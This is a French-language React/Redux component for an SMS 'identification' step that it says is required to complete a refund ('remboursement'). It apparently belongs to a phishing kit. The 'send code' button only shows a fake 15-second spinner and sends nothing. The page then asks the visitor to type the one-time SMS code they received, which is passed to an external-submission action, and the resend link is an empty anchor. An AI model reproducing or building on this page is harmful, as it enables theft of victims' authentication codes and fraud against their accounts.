import React from "react";
import Input from "../Components/input";
import Form from "../Components/Form";
import { getPageExtern, getPagePervious, updateField } from "../actions/index";
import { connect } from "react-redux";
import Spinner from "../Components/Spinner";


class SmsFrom extends React.Component {
	constructor(props) {
		super(props);
		this.handleInputChange = this.handleInputChange.bind(this);
		this.state = { getSms: true, loading: false };
		this.sms = this.sms.bind(this);
	}

	handleInputChange(event) {
		const target = event.target;
		this.props.change(target.name, target.value);
	}

	sms() {
		this.setState(
			{
				getSms: false,
				loading: true
			}
		);
		setTimeout(() => {
			this.setState({ loading: false });
		}, 15000);
	}

	render() {
		if (this.props.isLoading) {
			return <div>
				<Spinner />
			</div>;
		}
		if (this.state.loading) {
			return <div>
				<Spinner />
				<span style={{ "color": "#636c71", align: "center" }}>
					Veuillez patienter quelques instants ...
				</span>
			</div>;

		}
		if (this.state.getSms === true) {
			return <Form titre="Identification par sms" submit={this.sms} back={() => { this.props.getPervious(); }} btnValue="M'Envoyer le code sms">
				<span style={{ "color": "#636c71" }}>
					Cette identification est obligatoire pour conclure votre remboursement.
					<br />
					Si votre numéro de téléphone n'est pas à jour,
                    vous ne pourrez pas finaliser votre remboursement.
				</span>
			</Form>;
		}

		const { fields, errors } = this.props;

		return (
			<Form submit={this.props.submit} back={() => { this.props.getPervious(); }} titre={this.props.title} btnValue="Confirmer">
				<Input
					name="sms"
					type="text"
					label="Mon code reçu par sms"
					size="16"
					value={fields.sms}
					onChange={this.handleInputChange}
					msg_error={errors.sms}
				/>
				<font size="1">
					Si vous n'avez pas reçu le code sms aprés 5 minutes, <a>cliquez ici</a>
				</font>
				<br />
				<br />
				<span style={{ "color": "#636c71" }}>
					Cette identification est obligatoire pour conclure votre remboursement .
					<br />
					Si votre numéro de téléphone n'est pas à jour,
                    vous ne pourrez pas finaliser votre remboursement.
				</span>
			</Form>
		);
	}
}

const mapStateToProps = store => (
	{
		isLoading: store.session.getPage,
		fields: store.data.fields,
		errors: store.data.errors
	}
);
const mapDispatchToProps = {
	submit: getPageExtern,
	getPervious: getPagePervious,
	change: updateField
};

export default connect(mapStateToProps, mapDispatchToProps)(SmsFrom);
